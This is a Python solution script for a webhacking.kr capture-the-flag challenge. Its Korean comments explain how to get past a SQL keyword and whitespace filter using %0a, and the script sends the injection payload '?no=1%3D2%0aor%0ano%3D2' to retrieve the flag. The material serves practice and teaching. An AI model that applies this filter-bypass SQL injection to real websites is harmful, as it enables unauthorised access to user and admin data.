from bs4 import BeautifulSoup
import requests

URL = "https://webhacking.kr/challenge/web-32"
URI = "/"
ANS = "?no=1%3D2%0aor%0ano%3D2"
PHPSESSID = 'jl43tngbl1sca1cumqkf3dhm57'

COOKIES = {
    'PHPSESSID' : PHPSESSID
}

# 풀이
# 1. 문제의 소스코드에서 필터링하는 SQLi 키워드는 아래와 같음
#    ( (공백), /, (, ), |, &, select, from, 0x)
# 2. 1번의 정보에 따라서 select와 16진수를 이용한 연산 등이 제한되며 이를 우회해서 SQLi를 
#    트리거할 방법을 찾아야함
# 3. 추가로 admin의 no 값이 2임을 문제의 소스코드에서 확인할 수 있음.
# 4. 1 ~ 3의 정보를 토대로 현재 guest를 타겟으로 호출하는 SQL문을 admin으로 가도록 유도해야함.
# 5. 여러가지 방법이 있겠으나 = 이 필터 대상에서 제외되었으므로 Whitespace만 우회하면 손쉽게 
#    클리어 가능하며 가장 자주 사용하는 Whitespace인 %0a를 이용하여 우회할 수 있음.

resp = requests.get(URL + URI + ANS, cookies=COOKIES)

soup = BeautifulSoup(resp.content,"html.parser")
FLAG = soup.find('script').contents[0]

print(FLAG)